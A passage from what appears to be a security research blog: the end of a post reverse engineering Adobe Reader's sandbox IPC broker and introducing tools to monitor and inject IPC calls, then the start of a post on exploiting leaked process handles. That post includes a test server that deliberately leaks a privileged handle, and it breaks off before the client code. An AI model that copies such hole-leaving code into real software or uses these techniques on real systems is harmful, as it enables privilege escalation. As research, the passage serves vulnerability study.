<p><code>InvokeCallback</code> parses out the buffer and handles validation of data, at a high level (ensures strings are strings, buffers and sizes match up, etc.). This is probably a good time to document the supported argument types. There are 10 types in total, two of which are placeholder:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ArgType = {
</span><span class='line'>    0: "INVALID_TYPE",
</span><span class='line'>    1: "WCHAR_TYPE", 
</span><span class='line'>    2: "ULONG_TYPE",
</span><span class='line'>    3: "UNISTR_TYPE", # treated same as WCHAR_TYPE
</span><span class='line'>    4: "VOIDPTR_TYPE",
</span><span class='line'>    5: "INPTR_TYPE",
</span><span class='line'>    6: "INOUTPTR_TYPE",
</span><span class='line'>    7: "ASCII_TYPE",
</span><span class='line'>    8: "MEM_TYPE", 
</span><span class='line'>    9: "LAST_TYPE" 
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>These are taken from <a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/internal_types.h#L16"><code>internal_types</code></a>,
but you&rsquo;ll notice there are two additional types: <code>ASCII_TYPE</code> and <code>MEM_TYPE</code>, and are unique to Reader. <code>ASCII_TYPE</code> is, as expected, a simple 7bit ASCII string. <code>MEM_TYPE</code> is a memory structure used by the broker to read
data out of the sandboxed process, ie. for more complex types that can&rsquo;t be trivially passed via the API. It&rsquo;s additionally used for data blobs, such as PNG images, enhanced-format datafiles, and more.</p>

<p>Some of these types should be self-explanatory; <code>WCHAR_TYPE</code> is naturally a wide char, <code>ASCII_TYPE</code> an ascii string, and <code>ULONG_TYPE</code> a ulong. Let&rsquo;s look at a few of the non-obvious types, however: <code>VOIDPTR_TYPE</code>, <code>INPTR_TYPE</code>, <code>INOUTPTR_TYPE</code>, and <code>MEM_TYPE</code>.</p>

<p>Starting with <code>VOIDPTR_TYPE</code>, this is a standard type in the Chromium sandbox so we can just refer to the source code. <a href="https://github.com/adobe/chromium/blob/master/sandbox/src/sharedmem_ipc_server.cc#L181"><code>SharedMemIPCServer::GetArgs</code></a> calls <code>GetParameterVoidPtr</code>. Simply, once the value itself is extracted it&rsquo;s cast to a void ptr:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>*param = *(reinterpret_cast&lt;void**&gt;(start));</span></code></pre></td></tr></table></div></figure>


<p>This allows tags to reference objects and data within the broker process itself. An example might be <code>NtOpenProcessToken</code>, whose first parameter is a handle to the target process. This would be retrieved first by a call to <code>OpenProcess</code>, handed back to the child process, and then supplied in any future calls that may need to use the handle as a <code>VOIDPTR_TYPE</code>.</p>

<p>In the Chromium source code, <code>INPTR_TYPE</code> is extracted as a raw value via <code>GetRawParameter</code> and no additional processing is performed. However, in Adobe Reader, it&rsquo;s actually extracted in the same way <code>INOUTPTR_TYPE</code> is.</p>

<p><code>INOUTPTR_TYPE</code> is wrapped as a <a href="https://github.com/adobe/chromium/blob/master/sandbox/src/internal_types.h#L28"><code>CountedBuffer</code></a> and may be written to during the IPC call. For example, if <code>CreateProcessW</code> is invoked, the <code>PROCESS_INFORMATION</code> pointer will be of type <code>INOUTPTR_TYPE</code>.</p>

<p>The final type is <code>MEM_TYPE</code>, which is unique to Adobe Reader. We can define the structure as:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>struct MEM_TYPE {
</span><span class='line'>  HANDLE hProcess;
</span><span class='line'>  DWORD lpBaseAddress;
</span><span class='line'>  SIZE_T nSize;
</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>


<p>As mentioned, this type is primarily used to transfer data buffers to and from the broker process. It seems crazy. Each tag is responsible for performing its own validation of the provided values before they&rsquo;re used in any <code>ReadProcessMemory/WriteProcessMemory</code> call.</p>

<p>Once the broker has parsed out the passed arguments, it fetches the context dispatcher and identifies our tag handler:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ContextDispatcher = *(int (__thiscall ****)(_DWORD, int *, int *))(Context + 24);// fetch dispatcher function from Server control
</span><span class='line'>target_info = Context + 28;
</span><span class='line'>handler = (**ContextDispatcher)(ContextDispatcher, &ipc_params, &callback_generic);// PolicyBase::OnMessageReady</span></code></pre></td></tr></table></div></figure>


<p>The handler is fetched from
<a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/sandbox_policy_base.cc#L374"><code>PolicyBase::OnMessageReady</code></a>,
which winds up calling
<a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/crosscall_server.cc#L268"><code>Dispatcher::OnMessageReady</code></a>.
This is a pretty simple function that crawls the registered IPC tag list for
the correct handler. We finally hit <code>InvokeCallbackArgs</code>, unique to Reader,
which invokes the handler with the proper argument count:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>switch ( ParamCount )
</span><span class='line'>  {
</span><span class='line'>    case 0:
</span><span class='line'>      v7 = callback_generic(_this, CrossCallParamsEx);
</span><span class='line'>      goto LABEL_20;
</span><span class='line'>    case 1:
</span><span class='line'>      v7 = ((int (__thiscall *)(void *, int, _DWORD))callback_generic)(_this, CrossCallParamsEx, *args);
</span><span class='line'>      goto LABEL_20;
</span><span class='line'>    case 2:
</span><span class='line'>      v7 = ((int (__thiscall *)(void *, int, _DWORD, _DWORD))callback_generic)(_this, CrossCallParamsEx, *args, args[1]);
</span><span class='line'>      goto LABEL_20;
</span><span class='line'>    case 3:
</span><span class='line'>      v7 = ((int (__thiscall *)(void *, int, _DWORD, _DWORD, _DWORD))callback_generic)(
</span><span class='line'>             _this,
</span><span class='line'>             CrossCallParamsEx,
</span><span class='line'>             *args,
</span><span class='line'>             args[1],
</span><span class='line'>             args[2]);
</span><span class='line'>      goto LABEL_20;
</span><span class='line'>
</span><span class='line'>[...]</span></code></pre></td></tr></table></div></figure>


<p>In total, Reader supports tag functions with up to 17 arguments. I have no idea why that would be necessary, but it is. Additionally note the first two arguments to each tag handler: context handler (dispatcher) and <code>CrossCallParamsEx</code>. This last structure is actually the broker&rsquo;s version of a <code>CrossCallParams</code> with more paranoia.</p>

<p>A single function is used to register IPC tags, called from a single initialization function, making it relatively easy for us to scrape them all at runtime. Pulling out all of the IPC tags can be done both statically and dynamically; the former is far easier, the latter is more accurate. I&rsquo;ve implemented a static generator using IDAPython, available in this project&rsquo;s repository (<code>ida_find_tags.py</code>), and can be used to pull all supported IPC tags out of Reader along with their parameters. This is not going to be wholly indicative of all possible calls, however. During initialization of the sandbox, many feature checks are performed to probe the availability of certain capabilities. If these fail, the tag is not registered.</p>

<p>Tags are given a handle to <code>CrossCallParamsEx</code>, which gives them access to the <code>CrossCallReturn</code> structure. This is <a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/crosscall_params.h#L79">defined here</a> and, repeated from above, defined as:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>struct CrossCallReturn {
</span><span class='line'>  uint32 tag_;
</span><span class='line'>  uint32 call_outcome;
</span><span class='line'>  union {
</span><span class='line'>    NTSTATUS nt_status;
</span><span class='line'>    DWORD win32_result;
</span><span class='line'>  };
</span><span class='line'>
</span><span class='line'>  HANDLE handle;
</span><span class='line'>  uint32 extended_count;
</span><span class='line'>  MultiType extended[kExtendedReturnCount];
</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>


<p>This 52 byte structure is embedded in the <code>CrossCallParams</code> transferred by the sandboxed process. Once the tag has returned from execution, the following occurs:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> if (error) {
</span><span class='line'>    if (handler)
</span><span class='line'>      SetCallError(SBOX_ERROR_FAILED_IPC, call_result);
</span><span class='line'>  } else {
</span><span class='line'>    memcpy(call_result, &ipc_info.return_info, sizeof(*call_result));
</span><span class='line'>    SetCallSuccess(call_result);
</span><span class='line'>    if (params-&gt;IsInOut()) {
</span><span class='line'>      // Maybe the params got changed by the broker. We need to upadte the
</span><span class='line'>      // memory section.
</span><span class='line'>      memcpy(ipc_buffer, params.get(), output_size);
</span><span class='line'>    }
</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>


<p>and the sandboxed process can finally read out its result. Note that this mechanism does not allow for the exchange of more complex types, hence the availability of <code>MEM_TYPE</code>. The final step is signaling the <code>pong_event</code>, completing the call and freeing the channel.</p>

<h3>Tags</h3>

<p>Now that we understand how the IPC mechanism itself works, let&rsquo;s examine the implemented tags in the sandbox. Tags are registered during initialization by a function we&rsquo;ll call <code>InitializeSandboxCallback</code>. This is a large function that handles allocating sandbox tag objects and invoking their respective initalizers. Each initializer uses a function, <code>RegisterTag</code>, to construct and register individual tags. A tag is defined by a <code>SandTag</code> structure:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>typedef struct SandTag {
</span><span class='line'>  DWORD IPCTag;
</span><span class='line'>  ArgType Arguments[17];
</span><span class='line'>  LPVOID Handler;
</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>


<p>The <code>Arguments</code> array is initialized to <code>INVALID_TYPE</code> and ignored if the tag does not use all 17 slots. Here&rsquo;s an example of a tag structure:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>.rdata:00DD49A8 IpcTag3         dd 3                    ; IPCTag
</span><span class='line'>.rdata:00DD49A8                                         ; DATA XREF: 000190FAr
</span><span class='line'>.rdata:00DD49A8                                         ; 00019140o ...
</span><span class='line'>.rdata:00DD49A8                 dd 1, 6 dup(2), 0Ah dup(0); Arguments
</span><span class='line'>.rdata:00DD49A8                 dd offset FilesystemDispatcher__NtCreateFile; Handler</span></code></pre></td></tr></table></div></figure>


<p>Here we see tag 3 with 7 arguments; the first is <code>WCHAR_TYPE</code> and the remaining 6 are <code>ULONG_TYPE</code>. This lines up with what know to be the <a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/filesystem_dispatcher.cc#L22">NtCreateFile tag handler</a>.</p>

<p>Each tag is part of a group that denotes its behavior. There are 20 groups in total:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>SandboxFilesystemDispatcher
</span><span class='line'>SandboxNamedPipeDispatcher
</span><span class='line'>SandboxProcessThreadDispatcher
</span><span class='line'>SandboxSyncDispatcher
</span><span class='line'>SandboxRegistryDispatcher
</span><span class='line'>SandboxBrokerServerDispatcher
</span><span class='line'>SandboxMutantDispatcher
</span><span class='line'>SandboxSectionDispatcher
</span><span class='line'>SandboxMAPIDispatcher
</span><span class='line'>SandboxClipboardDispatcher
</span><span class='line'>SandboxCryptDispatcher
</span><span class='line'>SandboxKerberosDispatcher
</span><span class='line'>SandboxExecProcessDispatcher
</span><span class='line'>SandboxWininetDispatcher
</span><span class='line'>SandboxSelfhealDispatcher
</span><span class='line'>SandboxPrintDispatcher
</span><span class='line'>SandboxPreviewDispatcher
</span><span class='line'>SandboxDDEDispatcher
</span><span class='line'>SandboxAtomDispatcher
</span><span class='line'>SandboxTaskbarManagerDispatcher</span></code></pre></td></tr></table></div></figure>


<p>The names were extracted either from the Reader binary itself or through correlation with Chromium. Each dispatcher implements an initialization routine that invokes <code>RegisterDispatchFunction</code> for each tag. The number of registered tags will differ depending on the installation, version, features, etc. of the Reader process. <code>SandboxBrokerServerDispatcher</code>, for example, can have a sway of approximately 25 tags.</p>

<p>Instead of providing a description of each dispatcher in this post, I&rsquo;ve instead put together a separate page, which can be found <a href="http://hatRiot.github.io/other/adobe-reader-tags.html">here</a>. This page can be used as a tag reference and has some general information about each. Over time I&rsquo;ll add my notes on the calls. I&rsquo;ve additionally pushed the scripts used to extract tag information from the Reader binary and generate the table to the <code>sander</code> repository detailed below.</p>

<h3>libread</h3>

<p>Over the course of this research, I developed a library and set of tools for examining and exercising the Reader sandbox. The library, <code>libread</code>, was developed to programmatically interface with the broker in real time,
allowing for quickly exercising components of the broker and dynamically reversing various facilities. In addition, the library was critical during my fuzzing expeditions. All of the fuzzing tools and data will be available in the next post in this series.</p>

<p><code>libread</code> is fairly flexible and easy to use, but still pretty rudimentary and, of course, built off of my reverse engineering efforts. It won&rsquo;t be feature complete nor even completely accurate. Pull requests are welcome.</p>

<p>The library implements all of the notable structures and provides a few helper functions for locating the <code>ServerControl</code> from the broker process. As we&rsquo;ve seen, a <code>ServerControl</code> is a broker&rsquo;s view of a channel and it is held by the broker alone. This means it&rsquo;s not somewhere predictable in shared memory and we&rsquo;ve got to scan the broker&rsquo;s memory hunting it. From the sandbox side there is also a <code>find_memory_map</code> helper for locating the base address of the shared memory map.</p>

<p>In addition to this library I&rsquo;m releasing <code>sander</code>. This is a command line tool that consumes <code>libread</code> to provide some useful functionality for inspecting the sandbox:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ sander.exe -h
</span><span class='line'>[-] sander: [action] &lt;pid&gt;
</span><span class='line'>          -m   -  Monitor mode
</span><span class='line'>          -d   -  Dump channels
</span><span class='line'>          -t   -  Trigger test call (tag 62)
</span><span class='line'>          -c   -  Capture IPC traffic and log to disk
</span><span class='line'>          -h   -  Print this menu</span></code></pre></td></tr></table></div></figure>


<p>The most useful functionality provided here is the <code>-m</code> flag. This allows one to monitor the IPC calls and their arguments in real time:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ sander.exe -m 6132
</span><span class='line'>[5184] ESP: 02e1f764    Buffer 029f0134 Tag 266 1 Parameters
</span><span class='line'>      WCHAR_TYPE: _WVWT*&^$
</span><span class='line'>[5184] ESP: 02e1f764    Buffer 029f0134 Tag 34  1 Parameters
</span><span class='line'>      WCHAR_TYPE: C:\Users\bja\desktop\test.pdf
</span><span class='line'>[5184] ESP: 02e1f764    Buffer 029f0134 Tag 247 2 Parameters
</span><span class='line'>      WCHAR_TYPE: C:\Users\bja\desktop\test.pdf
</span><span class='line'>      ULONG_TYPE: 00000000
</span><span class='line'>[5184] ESP: 02e1f764    Buffer 029f0134 Tag 16  6 Parameters
</span><span class='line'>      WCHAR_TYPE: Software\Adobe\Acrobat Reader\DC\SessionManagement
</span><span class='line'>      ULONG_TYPE: 00000040
</span><span class='line'>      VOIDPTR_TYPE: 00000434
</span><span class='line'>      ULONG_TYPE: 000f003f
</span><span class='line'>      ULONG_TYPE: 00000000
</span><span class='line'>      ULONG_TYPE: 00000000
</span><span class='line'>[6020] ESP: 037dfca4    Buffer 029f0134 Tag 16  6 Parameters
</span><span class='line'>      WCHAR_TYPE: cWindowsCurrent
</span><span class='line'>      ULONG_TYPE: 00000040
</span><span class='line'>      VOIDPTR_TYPE: 0000043c
</span><span class='line'>      ULONG_TYPE: 000f003f
</span><span class='line'>      ULONG_TYPE: 00000000
</span><span class='line'>      ULONG_TYPE: 00000000
</span><span class='line'>[5184] ESP: 02e1f764    Buffer 029f0134 Tag 16  6 Parameters
</span><span class='line'>      WCHAR_TYPE: cWin0
</span><span class='line'>      ULONG_TYPE: 00000040
</span><span class='line'>      VOIDPTR_TYPE: 00000434
</span><span class='line'>      ULONG_TYPE: 000f003f
</span><span class='line'>      ULONG_TYPE: 00000000
</span><span class='line'>      ULONG_TYPE: 00000000
</span><span class='line'>[5184] ESP: 02e1f764    Buffer 029f0134 Tag 17  4 Parameters
</span><span class='line'>      WCHAR_TYPE: cTab0
</span><span class='line'>      ULONG_TYPE: 00000040
</span><span class='line'>      VOIDPTR_TYPE: 00000298
</span><span class='line'>      ULONG_TYPE: 000f003f
</span><span class='line'>[2572] ESP: 0335fd5c    Buffer 029f0134 Tag 17  4 Parameters
</span><span class='line'>      WCHAR_TYPE: cPathInfo
</span><span class='line'>      ULONG_TYPE: 00000040
</span><span class='line'>      VOIDPTR_TYPE: 000003cc
</span><span class='line'>      ULONG_TYPE: 000f003f</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;re also able to dump all IPC calls in the brokers&#8217; channels (<code>-d</code>), which can help debug threading issues when fuzzing, and trigger a test IPC call (<code>-t</code>). This latter function demonstrates how to send your own IPC calls via <code>libread</code> as well as allows you to test out additional tooling.</p>

<p>The last available feature is the <code>-c</code> flag, which captures all IPC traffic and logs the channel buffer to a file on disk. I used this primarily to seed part of my corpus during fuzzing efforts, as well as aid during some reversing efforts. It&rsquo;s extremely useful for replaying requests and gathering a baseline corpus of real traffic. We&rsquo;ll discuss this further in forthcoming posts.</p>

<p>That about concludes this initial post. Next up I&rsquo;ll discuss the various fuzzing strategies used on this unique interface, the frustrating amount of failure, and the bugs shooken out.</p>

<h3>Resources</h3>

<ul>
<li><a href="https://github.com/hatRiot/sander">Sander</a></li>
<li><a href="https://github.com/hatRiot/libread">libread</a></li>
<li><a href="http://hatRiot.github.io/other/adobe-reader-tags.html">Sandbox tag table</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploiting Leaked Process and Thread Handles]]></title>
    <link href="http://hatRiot.github.io/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/"/>
    <updated>2019-08-22T14:10:04-07:00</updated>
    <id>http://hatRiot.github.io/blog/2019/08/22/exploiting-leaked-process-and-thread-handles</id>
    <content type="html"><![CDATA[<p>Over the years I&rsquo;ve seen and exploited the occasional leaked handle bug. These can be
particularly fun to toy with, as the handles aren&rsquo;t always granted
<code>PROCESS_ALL_ACCESS</code> or <code>THREAD_ALL_ACCESS</code>, requiring a bit more ingenuity.
This post will address the various access rights assignable to handles and what we
can do to exploit them to gain elevated code execution. I&rsquo;ve chosen to focus
specifically on process and thread handles as this seems to be the most common,
but surely other objects can be exploited in similar manner.</p>

<p>As background, while this bug can occur under various circumstances, I&rsquo;ve most
commonly seen it manifest when some privileged process opens a handle with
<code>bInheritHandle</code> set to true. Once this happens, any child process of this
privileged process inherits the handle and all access it grants. As example,
assume a SYSTEM level process does this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, GetCurrentProcessId());</span></code></pre></td></tr></table></div></figure>


<p>Since it&rsquo;s allowing the opened handle to be inherited, any child process
will gain access to it. If they execute userland code impersonating the desktop
user, as a service might often do, those userland processes will have access to
that handle.</p>

<h2>Existing bugs</h2>

<p>There are several public bugs we can point to over the years as example and
inspiration. As per usual James Forshaw has a fun one from 2016[0] in which
he&rsquo;s able to leak a privileged thread handle out of the secondary logon
service with <code>THREAD_ALL_ACCESS</code>. This is the most &ldquo;open&rdquo; of permissions, but
he exploited it in a novel way that I was unaware of, at the time.</p>

<p>Another one from Ivan Fratric exploited[1] a leaked process handle with
<code>PROCESS_DUP_HANDLE</code>, which even Microsoft knew was bad. In his <code>Bypassing
Mitigations by Attacking JIT Server in Microsoft Edge</code> whitepaper, he
identifies the JIT server process mapping memory into the content process. To
do this, the JIT process needs a handle to it. The content process calls
<code>DuplicateHandle</code> on itself with the <code>PROCESS_DUP_HANDLE</code>, which can be
exploited to obtain a full access handle.</p>

<p>A more recent example is a Dell LPE [2] in which a <code>THREAD_ALL_ACCESS</code> handle
was obtained from a privileged process. They were able to exploit this via a
dropped DLL and an APC.</p>

<h2>Setup</h2>

<p>In this post, I wanted to examine all possible access rights to determine which
were exploitable on there own and which were not. Of those that were not, I
tried to determine what concoction of privileges were necessary to make it so.
I&rsquo;ve tried to stay &ldquo;realistic&rdquo; here in my experience, but you never know what
you&rsquo;ll find in the wild, and this post reflects that.</p>

<p>For testing, I created a simple client and server: a privileged server that
leaks a handle, and a client capable of consuming it. Here&rsquo;s the server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#include "pch.h"
</span><span class='line'>#include &lt;iostream&gt;
</span><span class='line'>#include &lt;Windows.h&gt;
</span><span class='line'>
</span><span class='line'>int main(int argc, char **argv)
</span><span class='line'>{
</span><span class='line'>    if (argc &lt;= 1) {
</span><span class='line'>        printf("[-] Please give me a target PID\n");
</span><span class='line'>        return -1;
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    HANDLE hUserToken, hUserProcess;
</span><span class='line'>    HANDLE hProcess, hThread;
</span><span class='line'>    STARTUPINFOA si;
</span><span class='line'>    PROCESS_INFORMATION pi;
</span><span class='line'>
</span><span class='line'>    ZeroMemory(&si, sizeof(si));
</span><span class='line'>    si.cb = sizeof(si);
</span><span class='line'>    ZeroMemory(&pi, sizeof(pi));
</span><span class='line'>
</span><span class='line'>    hUserProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, atoi(argv[1]));
</span><span class='line'>    if (!OpenProcessToken(hUserProcess, TOKEN_ALL_ACCESS, &hUserToken)) {
</span><span class='line'>        printf("[-] Failed to open user process: %d\n", GetLastError());
</span><span class='line'>        CloseHandle(hUserProcess);
</span><span class='line'>        return -1;
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, GetCurrentProcessId());
</span><span class='line'>    printf("[+] Process: %x\n", hProcess);
</span><span class='line'>
</span><span class='line'>    CreateProcessAsUserA(hUserToken, 
</span><span class='line'>        "VulnServiceClient.exe", 
</span><span class='line'>        NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
</span><span class='line'>    SuspendThread(hThread);
</span><span class='line'>    return 0;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>In the above, I&rsquo;m grabbing a handle to the token we want to impersonate,
opening an inheritable handle to the current process (which we&rsquo;re running as
SYSTEM), then spawning a child process. This child process is simply my client
application, which will go about attempting to exploit the handle.</p>

<p>The client is, of course, a little more involved. The only component that needs
a little discussion up front is fetching the leaked handle. This can be done
via <code>NtQuerySystemInformation</code> and does not require any special privileges:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
